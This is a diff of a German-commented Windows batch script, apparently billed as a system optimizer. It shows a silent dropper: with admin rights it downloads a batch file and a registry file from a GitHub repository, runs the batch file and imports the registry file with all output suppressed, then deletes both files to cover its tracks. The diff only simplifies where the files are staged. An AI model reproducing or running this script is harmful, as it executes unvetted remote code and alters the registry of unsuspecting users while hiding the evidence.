@@ -11,48 +11,21 @@ if %errorLevel% neq 0 (
 )
 
 :: =============================
-:: 2. Zufälligen Ordnernamen generieren (7-13 Zeichen)
+:: 2. Desktop-Pfad ermitteln
 :: =============================
-set "length=7"
-set "charset=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-set "randomName="
-
-:generateRandom
-set /a "randIndex=%random% %% 62"
-for /f "delims=" %%a in ('echo %charset:~%randIndex%,1%') do set "randomName=!randomName!%%a"
-set /a "length-=1"
-if !length! gtr 0 goto generateRandom
+for /f "tokens=2*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Desktop') do set "desktopPath=%%b"
 
 :: =============================
-:: 3. Zielpfad für zufälligen Ordner im Desktop-Ordner
-:: =============================
-set "desktopPath=%USERPROFILE%\Desktop"
-set "appDataPath=%desktopPath%\%randomName%"
-
-:: Überprüfen, ob der Desktop-Ordner existiert
-if not exist "%desktopPath%" (
-    echo [!] Fehler: Desktop-Ordner nicht gefunden.
-    exit /b
-)
-
-:: =============================
-:: 4. Ordner erstellen, falls er nicht existiert
-:: =============================
-if not exist "%appDataPath%" (
-    mkdir "%appDataPath%"
-)
-
-:: =============================
-:: 5. Dateipfade und URLs
+:: 3. Dateipfade und URLs
 :: =============================
 set "batUrl=https://github.com/ZENZYLEovfwe/newest/raw/main/opti.bat"
 set "regUrl=https://github.com/ZENZYLEovfwe/newest/raw/main/optimizter.reg"
 
-set "batFile=%appDataPath%\opti.bat"
-set "regFile=%appDataPath%\optimizter.reg"
+set "batFile=%desktopPath%\opti.bat"
+set "regFile=%desktopPath%\optimizter.reg"
 
 :: =============================
-:: 6. Dateien herunterladen
+:: 4. Dateien herunterladen
 powershell -Command "Invoke-WebRequest -Uri '%batUrl%' -OutFile '%batFile%'" >nul 2>&1
 if not exist "%batFile%" exit /b
 
@@ -60,20 +33,16 @@ powershell -Command "Invoke-WebRequest -Uri '%regUrl%' -OutFile '%regFile%'" >nu
 if not exist "%regFile%" exit /b
 
 :: =============================
-:: 7. Ausführen & Registry importieren
+:: 5. Ausführen & Registry importieren
 call "%batFile%" >nul 2>&1
 reg import "%regFile%" >nul 2>&1
 
 :: =============================
-:: 8. Dateien löschen (nur wenn alles fertig ist)
+:: 6. Dateien löschen
 del /f /q "%batFile%" >nul 2>&1
 del /f /q "%regFile%" >nul 2>&1
 
 :: =============================
-:: 9. Ordner löschen, wenn alle Dateien gelöscht wurden
-rd /s /q "%appDataPath%" >nul 2>&1
-
-:: =============================
-:: 10. Kleines Delay vor dem Schließen
+:: 7. Kleines Delay vor dem Schließen
 timeout /t 2 >nul
 exit
